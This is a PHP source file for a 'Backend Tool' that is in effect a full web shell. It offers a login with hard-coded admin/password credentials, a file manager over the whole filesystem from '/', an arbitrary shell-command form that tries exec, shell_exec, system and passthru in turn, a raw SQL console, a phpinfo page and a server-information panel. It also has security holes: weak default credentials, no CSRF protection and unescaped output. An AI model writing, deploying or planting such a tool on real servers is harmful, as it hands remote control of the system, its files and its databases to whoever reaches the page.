<?php
session_start();

/**
 * Basic authentication class.
 */
class Auth {
    // Hard-coded credentials – change these for production!
    private $username = 'admin';
    private $password = 'password';

    public function login($user, $pass) {
        if ($user === $this->username && $pass === $this->password) {
            $_SESSION['logged_in'] = true;
            return true;
        }
        return false;
    }
    public function check() {
        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
    }
    public function logout() {
        session_destroy();
    }
}

/**
 * FileManager class encapsulates file system operations.
 */
class FileManager {
    private $baseDir;
    public function __construct($baseDir = '/') {
        $this->baseDir = realpath($baseDir);
    }
    // Resolve a path relative to the base directory.
    public function resolvePath($path) {
        if (substr($path, 0, 1) === DIRECTORY_SEPARATOR) {
            $realPath = realpath($path);
        } else {
            $realPath = realpath($this->baseDir . DIRECTORY_SEPARATOR . $path);
        }
        return $realPath;
    }
    public function listDirectory($path = '') {
        $dir = $this->resolvePath($path);
        if (!$dir || !is_dir($dir)) return false;
        return scandir($dir);
    }
    public function readFile($file) {
        $filePath = $this->resolvePath($file);
        if (!$filePath || !is_file($filePath)) return false;
        return file_get_contents($filePath);
    }
    public function createFile($file, $content = '') {
        $filePath = $this->resolvePath($file);
        if (!$filePath) {
            $filePath = (substr($file, 0, 1) === DIRECTORY_SEPARATOR)
                      ? $file : $this->baseDir . DIRECTORY_SEPARATOR . $file;
        }
        if (file_exists($filePath)) return false;
        return file_put_contents($filePath, $content) !== false;
    }
    public function updateFile($file, $content) {
        $filePath = $this->resolvePath($file);
        if (!$filePath || !is_file($filePath)) return false;
        return file_put_contents($filePath, $content) !== false;
    }
    public function deleteFile($file) {
        $filePath = $this->resolvePath($file);
        if (!$filePath) return false;
        if (is_dir($filePath)) {
            return rmdir($filePath); // Only works for empty directories.
        } else {
            return unlink($filePath);
        }
    }
    public function makeDirectory($dir) {
        $dirPath = (substr($dir, 0, 1) === DIRECTORY_SEPARATOR)
                 ? $dir : $this->baseDir . DIRECTORY_SEPARATOR . $dir;
        if (file_exists($dirPath)) return false;
        return mkdir($dirPath, 0755, true);
    }
    public function renameFile($oldName, $newName) {
        $oldPath = $this->resolvePath($oldName);
        $newPath = (substr($newName, 0, 1) === DIRECTORY_SEPARATOR)
                 ? $newName : $this->baseDir . DIRECTORY_SEPARATOR . $newName;
        if (!$oldPath || !file_exists($oldPath)) return false;
        return rename($oldPath, $newPath);
    }
}

/**
 * DBManager class provides minimal database management functionality.
 */
class DBManager {
    private $pdo;
    public function __construct($host, $user, $pass, $dbname = null) {
        $dsn = "mysql:host=$host" . ($dbname ? ";dbname=$dbname" : "");
        try {
            $this->pdo = new PDO($dsn, $user, $pass);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        } catch(PDOException $e) {
            die("DB Connection failed: " . $e->getMessage());
        }
    }
    public function listDatabases() {
        $stmt = $this->pdo->query("SHOW DATABASES");
        return $stmt->fetchAll(PDO::FETCH_COLUMN);
    }
    public function listTables() {
        $stmt = $this->pdo->query("SHOW TABLES");
        return $stmt->fetchAll(PDO::FETCH_COLUMN);
    }
    public function showTableStructure($table) {
        $stmt = $this->pdo->query("DESCRIBE `$table`");
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    public function executeQuery($query) {
        $stmt = $this->pdo->query($query);
        if ($stmt->columnCount() > 0) {
            return $stmt->fetchAll(PDO::FETCH_ASSOC);
        } else {
            return "Query executed successfully.";
        }
    }
}

/**
 * Command line execution function: tries exec(), shell_exec(), system(), passthru().
 */
function runCommand($cmd) {
    $result = ['output' => '', 'method' => 'none'];
    if (function_exists('exec')) {
        exec($cmd, $out, $ret);
        if (!empty($out)) {
            $result['output'] = implode("\n", $out);
            $result['method'] = 'exec';
            return $result;
        }
    }
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
        if ($output !== null) {
            $result['output'] = $output;
            $result['method'] = 'shell_exec';
            return $result;
        }
    }
    if (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
        if (!empty($output)) {
            $result['output'] = $output;
            $result['method'] = 'system';
            return $result;
        }
    }
    if (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
        if (!empty($output)) {
            $result['output'] = $output;
            $result['method'] = 'passthru';
            return $result;
        }
    }
    return $result;
}

// ------------------------------
// Authentication and Login Check
// ------------------------------
$auth = new Auth();
if (isset($_GET['logout'])) {
    $auth->logout();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (!$auth->check() && isset($_POST['username'], $_POST['password'])) {
    if ($auth->login($_POST['username'], $_POST['password'])) {
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Invalid credentials";
    }
}
if (!$auth->check()):
?>
<!DOCTYPE html>
<html>
<head>
  <title>Login - Backend Tool</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Dark Mode Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background-color: #121212; color: #e0e0e0; }
    .form-control, .btn { background-color: #1e1e1e; color: #e0e0e0; border: 1px solid #333; }
  </style>
</head>
<body class="bg-dark">
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-md-6">
         <h2 class="mt-5">Login</h2>
         <?php if (isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
         <form method="post" class="mt-3">
           <div class="mb-3">
             <label class="form-label">Username:</label>
             <input type="text" name="username" class="form-control" required>
           </div>
           <div class="mb-3">
             <label class="form-label">Password:</label>
             <input type="password" name="password" class="form-control" required>
           </div>
           <button type="submit" class="btn btn-primary">Login</button>
         </form>
      </div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
<?php
exit;
endif;

// -----------------------
// Navigation Menu Section
// -----------------------
$menu = $_GET['menu'] ?? 'files';
?>
<!DOCTYPE html>
<html>
<head>
  <title>Backend Tool</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Dark Mode Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background-color: #121212; color: #e0e0e0; }
    .navbar { background-color: #1f1f1f; }
    .navbar-brand, .nav-link { color: #e0e0e0 !important; }
    .table { background-color: #1e1e1e; color: #e0e0e0; }
    .table th, .table td { border-color: #333; }
    a { color: #0d6efd; }
  </style>
</head>
<body>
  <!-- Navigation Bar -->
  <nav class="navbar navbar-expand-lg navbar-dark">
    <div class="container-fluid">
      <a class="navbar-brand" href="#">Backend Tool</a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" 
              data-bs-target="#navbarNav" aria-controls="navbarNav" 
              aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
         <ul class="navbar-nav">
            <li class="nav-item"><a class="nav-link <?= ($menu=='files')?'active':''; ?>" href="?menu=files">Files</a></li>
            <li class="nav-item"><a class="nav-link <?= ($menu=='database')?'active':''; ?>" href="?menu=database">Database</a></li>
            <li class="nav-item"><a class="nav-link <?= ($menu=='phpinfo')?'active':''; ?>" href="?menu=phpinfo">PHP Info</a></li>
            <li class="nav-item"><a class="nav-link <?= ($menu=='command')?'active':''; ?>" href="?menu=command">Command Line</a></li>
         </ul>
         <ul class="navbar-nav ms-auto">
            <li class="nav-item"><a class="nav-link" href="?logout=1">Logout</a></li>
         </ul>
      </div>
    </div>
  </nav>

<?php
// ----------------------
// PHP Info View
// ----------------------
if ($menu == 'phpinfo') {
    echo "<div class='container mt-4'>";
    echo "<h3>PHP Info</h3>";
    
    // Capture the output of phpinfo()
    ob_start();
    phpinfo();
    $phpinfo = ob_get_clean();
    
    // Extract only the contents of the <body> tag
    if (preg_match('/<body>(.*?)<\/body>/is', $phpinfo, $matches)) {
        $phpinfo = $matches[1];
    }
    
    // Remove the default phpinfo styles
    $phpinfo = preg_replace('#<style.*?>.*?</style>#is', '', $phpinfo);
    
    // Add Bootstrap classes to tables for better styling
    $phpinfo = str_replace('<table ', '<table class="table table-bordered table-striped" ', $phpinfo);
    
    // Optionally, adjust headings to match Bootstrap sizes
    $phpinfo = str_replace(['<h1>', '<h2>'], ['<h1 class="h3">', '<h2 class="h4">'], $phpinfo);
    
    echo $phpinfo;
    echo "</div>";
    exit;
}


// ----------------------
// Command Line View
// ----------------------
if ($menu == 'command') {
    echo "<div class='container mt-4'>";
    echo "<h3>Command Line</h3>";
    if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        $result = runCommand($cmd);
        echo "<div class='alert alert-info'>Command executed with function: <strong>" . htmlspecialchars($result['method']) . "</strong></div>";
        echo "<pre>" . htmlspecialchars($result['output']) . "</pre>";
    }
    echo "<form method='post'>";
    echo "<div class='mb-3'><input type='text' name='cmd' class='form-control' placeholder='Enter command here' required></div>";
    echo "<button type='submit' class='btn btn-primary'>Execute Command</button>";
    echo "</form>";
    echo "</div>";
    exit;
}

// ----------------------
// Database Management Section
// ----------------------
if ($menu == 'database') {
    if (isset($_POST['db_config'])) {
        $_SESSION['db_config'] = [
            'host'   => $_POST['host'],
            'dbUser' => $_POST['dbUser'],
            'dbPass' => $_POST['dbPass'],
            'dbname' => $_POST['dbname']
        ];
        header("Location: " . $_SERVER['PHP_SELF'] . "?menu=database");
        exit;
    }
    if (!isset($_SESSION['db_config'])) {
        echo "<div class='container mt-4'>";
        echo "<h3>Database Configuration</h3>";
        echo "<form method='post'>";
        echo "<div class='mb-3'><label class='form-label'>Host:</label><input type='text' name='host' class='form-control' required></div>";
        echo "<div class='mb-3'><label class='form-label'>Username:</label><input type='text' name='dbUser' class='form-control' required></div>";
        echo "<div class='mb-3'><label class='form-label'>Password:</label><input type='password' name='dbPass' class='form-control'></div>";
        echo "<div class='mb-3'><label class='form-label'>Database (optional):</label><input type='text' name='dbname' class='form-control'></div>";
        echo "<button type='submit' name='db_config' class='btn btn-primary'>Save Configuration</button>";
        echo "</form>";
        echo "</div>";
        exit;
    }
    $config = $_SESSION['db_config'];
    $host   = $config['host'];
    $dbUser = $config['dbUser'];
    $dbPass = $config['dbPass'];
    $dbname = $_GET['db'] ?? ($config['dbname'] ?: null);
    try {
        $dbManager = new DBManager($host, $dbUser, $dbPass, $dbname);
    } catch (PDOException $e) {
        echo "<div class='container mt-4 alert alert-danger'>DB Connection error: " . $e->getMessage() . "</div>";
        exit;
    }
    echo "<div class='container mt-4'>";
    if (!$dbname) {
        echo "<h3>Databases</h3>";
        $databases = $dbManager->listDatabases();
        echo "<table class='table table-bordered'>";
        echo "<thead><tr><th>Name</th><th>Action</th></tr></thead><tbody>";
        foreach ($databases as $db) {
            echo "<tr><td>" . htmlspecialchars($db) . "</td><td>";
            echo "<a class='btn btn-sm btn-primary' href='?menu=database&db=" . urlencode($db) . "'>Select</a>";
            echo "</td></tr>";
        }
        echo "</tbody></table>";
    } else {
        echo "<h3>Database: " . htmlspecialchars($dbname) . "</h3>";
        if (isset($_GET['table'])) {
            $table = $_GET['table'];
            echo "<h4>Table Structure: " . htmlspecialchars($table) . "</h4>";
            $structure = $dbManager->showTableStructure($table);
            echo "<table class='table table-bordered'>";
            echo "<thead><tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr></thead><tbody>";
            foreach ($structure as $row) {
                echo "<tr>";
                echo "<td>" . htmlspecialchars($row['Field']) . "</td>";
                echo "<td>" . htmlspecialchars($row['Type']) . "</td>";
                echo "<td>" . htmlspecialchars($row['Null']) . "</td>";
                echo "<td>" . htmlspecialchars($row['Key']) . "</td>";
                echo "<td>" . htmlspecialchars($row['Default']) . "</td>";
                echo "<td>" . htmlspecialchars($row['Extra']) . "</td>";
                echo "</tr>";
            }
            echo "</tbody></table>";
            echo "<a class='btn btn-sm btn-info' href='?menu=database&db=" . urlencode($dbname) . "'>Back to Tables</a>";
        } else {
            echo "<h4>Tables</h4>";
            $tables = $dbManager->listTables();
            echo "<table class='table table-bordered'>";
            echo "<thead><tr><th>Name</th><th>Action</th></tr></thead><tbody>";
            foreach ($tables as $table) {
                echo "<tr><td>" . htmlspecialchars($table) . "</td><td>";
                echo "<a class='btn btn-sm btn-secondary' href='?menu=database&db=" . urlencode($dbname) . "&table=" . urlencode($table) . "'>Structure</a>";
                echo "</td></tr>";
            }
            echo "</tbody></table>";
        }
        echo "<h4 class='mt-4'>Run SQL Query</h4>";
        echo "<form method='post'>";
        echo "<div class='mb-3'><textarea name='query' class='form-control' rows='5' placeholder='Enter SQL query here'></textarea></div>";
        echo "<button type='submit' class='btn btn-primary'>Execute</button>";
        echo "</form>";
        if (isset($_POST['query'])) {
            echo "<h5 class='mt-4'>Query Result:</h5>";
            try {
                $result = $dbManager->executeQuery($_POST['query']);
                if (is_array($result)) {
                    if (count($result) > 0) {
                        echo "<table class='table table-bordered'><thead><tr>";
                        foreach (array_keys($result[0]) as $col) {
                            echo "<th>" . htmlspecialchars($col) . "</th>";
                        }
                        echo "</tr></thead><tbody>";
                        foreach ($result as $row) {
                            echo "<tr>";
                            foreach ($row as $value) {
                                echo "<td>" . htmlspecialchars($value) . "</td>";
                            }
                            echo "</tr>";
                        }
                        echo "</tbody></table>";
                    } else {
                        echo "<p>No results returned.</p>";
                    }
                } else {
                    echo "<p>" . htmlspecialchars($result) . "</p>";
                }
            } catch (PDOException $e) {
                echo "<div class='alert alert-danger'>Error executing query: " . $e->getMessage() . "</div>";
            }
        }
    }
    echo "</div>";
    exit;
}

// ----------------------
// Files Management Section (default view)
// ----------------------

// Helper function to render clickable breadcrumbs.
function renderBreadcrumbs($currentDir) {
    $breadcrumbs = [];
    $breadcrumbs[] = '<a href="?dir=">Root</a>';
    if (!empty($currentDir)) {
        $parts = explode('/', $currentDir);
        $accumulated = '';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $accumulated = ($accumulated === '') ? $part : $accumulated . '/' . $part;
            $breadcrumbs[] = '<a href="?dir=' . urlencode($accumulated) . '">' . htmlspecialchars($part) . '</a>';
        }
    }
    return implode(' / ', $breadcrumbs);
}

$baseDirectory = '/';
$fileManager = new FileManager($baseDirectory);
$action = $_GET['action'] ?? '';
$message = '';

// Get current directory before processing actions
$currentDir = $_GET['dir'] ?? '';

// Process file/directory actions
if ($action === 'mkdir' && isset($_POST['dirname'])) {
    $newDir = ($currentDir ? $currentDir . '/' : '') . $_POST['dirname'];
    $message = $fileManager->makeDirectory($newDir) ? "Directory created successfully." : "Failed to create directory or it already exists.";
    // Redirect back to the current directory
    header("Location: ?dir=" . urlencode($currentDir) . "&message=" . urlencode($message));
    exit;
} elseif ($action === 'createFile' && isset($_POST['filename'])) {
    $content = $_POST['content'] ?? '';
    $newFile = ($currentDir ? $currentDir . '/' : '') . $_POST['filename'];
    $message = $fileManager->createFile($newFile, $content) ? "File created successfully." : "Failed to create file or it already exists.";
    // Redirect back to the current directory
    header("Location: ?dir=" . urlencode($currentDir) . "&message=" . urlencode($message));
    exit;
} elseif ($action === 'updateFile' && isset($_POST['filename'])) {
    $content = $_POST['content'] ?? '';
    $message = $fileManager->updateFile($_POST['filename'], $content) ? "File updated successfully." : "Failed to update file.";
    // Redirect back to the current directory
    header("Location: ?dir=" . urlencode($currentDir) . "&message=" . urlencode($message));
    exit;
} elseif ($action === 'delete' && isset($_GET['target'])) {
    $message = $fileManager->deleteFile($_GET['target']) ? "Deleted successfully." : "Failed to delete.";
    // Redirect back to the current directory
    header("Location: ?dir=" . urlencode($currentDir) . "&message=" . urlencode($message));
    exit;
} elseif ($action === 'rename' && isset($_POST['newName'], $_POST['oldName'])) {
    // Get directory of the old file/folder to maintain proper path for new name
    $oldDir = dirname($_POST['oldName']);
    $oldDir = ($oldDir == '.') ? '' : $oldDir;
    $newName = ($oldDir ? $oldDir . '/' : '') . $_POST['newName'];
    $message = $fileManager->renameFile($_POST['oldName'], $newName) ? "Renamed successfully." : "Failed to rename.";
    // Redirect back to the current directory
    header("Location: ?dir=" . urlencode($currentDir) . "&message=" . urlencode($message));
    exit;
}

// Get message from URL if redirected
if (isset($_GET['message'])) {
    $message = $_GET['message'];
}

$files = $fileManager->listDirectory($currentDir);
?>

<div class="container my-4">
    <?php if ($message): ?>
        <div class="alert alert-info"><?php echo htmlspecialchars($message); ?></div>
    <?php endif; ?>

    <!-- Updated Server Info Panel using Bootstrap Badges -->
    <div class="mb-4">
      <h5>Server Info</h5>
      <div class="d-flex flex-wrap">
        <?php
$serverVars = [
    'HTTP_HOST', 'PHP_SELF', 'SERVER_ADDR', 'SERVER_NAME', 'SERVER_SOFTWARE','DOCUMENT_ROOT', 'REMOTE_HOST', 'REMOTE_PORT',
    'SERVER_PORT', 'SCRIPT_FILENAME', 'HTTP_USER_AGENT'
];
          $badgeClasses = ["primary", "success", "info", "warning", "danger"];
          $i = 0;
          foreach ($serverVars as $var) {
              if (isset($_SERVER[$var])) {
                  $class = $badgeClasses[$i % count($badgeClasses)];
                  echo '<span class="badge bg-' . $class . ' m-1">' . htmlspecialchars($var) . " : " . htmlspecialchars($_SERVER[$var]) . '</span> ';
                  $i++;
              }
          }
        ?>
      </div>
    </div>

    <h4>Current Directory: <?php echo renderBreadcrumbs($currentDir); ?></h4>
    <table class="table table-bordered table-striped mt-3">
         <thead>
             <tr>
                 <th>Name</th>
                 <th>Type</th>
                 <th>Permission</th>
                 <th>Actions</th>
             </tr>
         </thead>
         <tbody>
             <?php
             if ($files !== false) {
                 foreach ($files as $file) {
                     if ($file == '.' || $file == '..') continue;
                     $filePath = ($currentDir ? $currentDir . '/' : '') . $file;
                     $fullPath = $fileManager->resolvePath($filePath);
                     $perm = decoct(fileperms($fullPath) & 0777);
                     $permColored = is_writable($fullPath)
                        ? '<span style="color:green;">' . $perm . '</span>'
                        : '<span style="color:red;">' . $perm . '</span>';
                     echo "<tr>";
                     echo "<td>" . htmlspecialchars($file) . "</td>";
                     echo "<td>" . (is_dir($fullPath) ? "Directory" : "File") . "</td>";
                     echo "<td>" . $permColored . "</td>";
                     echo "<td>";
                     if (is_dir($fullPath)) {
                         echo "<a href='?dir=" . urlencode($filePath) . "' class='btn btn-sm btn-info'>Open</a> ";
                     } else {
                         echo "<a href='?action=edit&target=" . urlencode($filePath) . "&dir=" . urlencode($currentDir) . "' class='btn btn-sm btn-warning'>Edit</a> ";
                     }
                     echo "<a href='?action=rename&target=" . urlencode($filePath) . "&dir=" . urlencode($currentDir) . "' class='btn btn-sm btn-secondary'>Rename</a> ";
                     echo "<a href='?action=delete&target=" . urlencode($filePath) . "&dir=" . urlencode($currentDir) . "' class='btn btn-sm btn-danger' onclick='return confirm(\"Are you sure?\");'>Delete</a>";
                     echo "</td>";
                     echo "</tr>";
                 }
             } else {
                 echo "<tr><td colspan='4'>Unable to read directory.</td></tr>";
             }
             ?>
         </tbody>
    </table>

    <div class="row mt-4">
         <div class="col-md-6">
             <h4>Create Directory</h4>
             <form method="post" action="?action=mkdir&dir=<?= urlencode($currentDir); ?>">
                 <div class="mb-3">
                     <label class="form-label">Directory Name:</label>
                     <input type="text" name="dirname" class="form-control" required>
                 </div>
                 <button type="submit" class="btn btn-primary">Create Directory</button>
             </form>
         </div>
         <div class="col-md-6">
             <h4>Create File</h4>
             <form method="post" action="?action=createFile&dir=<?= urlencode($currentDir); ?>">
                 <div class="mb-3">
                     <label class="form-label">File Name:</label>
                     <input type="text" name="filename" class="form-control" required>
                 </div>
                 <div class="mb-3">
                     <label class="form-label">Content:</label>
                     <textarea name="content" rows="5" class="form-control"></textarea>
                 </div>
                 <button type="submit" class="btn btn-primary">Create File</button>
             </form>
         </div>
    </div>

    <?php
    if ($action === 'edit' && isset($_GET['target'])) {
        $target = $_GET['target'];
        $content = $fileManager->readFile($target);
        ?>
         <div class="mt-5">
             <h4>Edit File Content: <?= htmlspecialchars(basename($target)); ?></h4>
             <form method="post" action="?action=updateFile&dir=<?= urlencode($currentDir); ?>">
                 <input type="hidden" name="filename" value="<?= htmlspecialchars($target); ?>">
                 <div class="mb-3">
                     <textarea name="content" rows="10" class="form-control"><?= htmlspecialchars($content); ?></textarea>
                 </div>
                 <button type="submit" class="btn btn-primary">Update File</button>
             </form>
         </div>
    <?php 
    } elseif ($action === 'rename' && isset($_GET['target'])) {
        $target = $_GET['target'];
        ?>
         <div class="mt-5">
             <h4>Rename: <?= htmlspecialchars(basename($target)); ?></h4>
             <form method="post" action="?action=rename&dir=<?= urlencode($currentDir); ?>">
                 <input type="hidden" name="oldName" value="<?= htmlspecialchars($target); ?>">
                 <div class="mb-3">
                     <label class="form-label">New Name:</label>
                     <input type="text" name="newName" class="form-control" value="<?= htmlspecialchars(basename($target)); ?>" required>
                 </div>
                 <button type="submit" class="btn btn-primary">Rename</button>
             </form>
         </div>
    <?php } ?>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
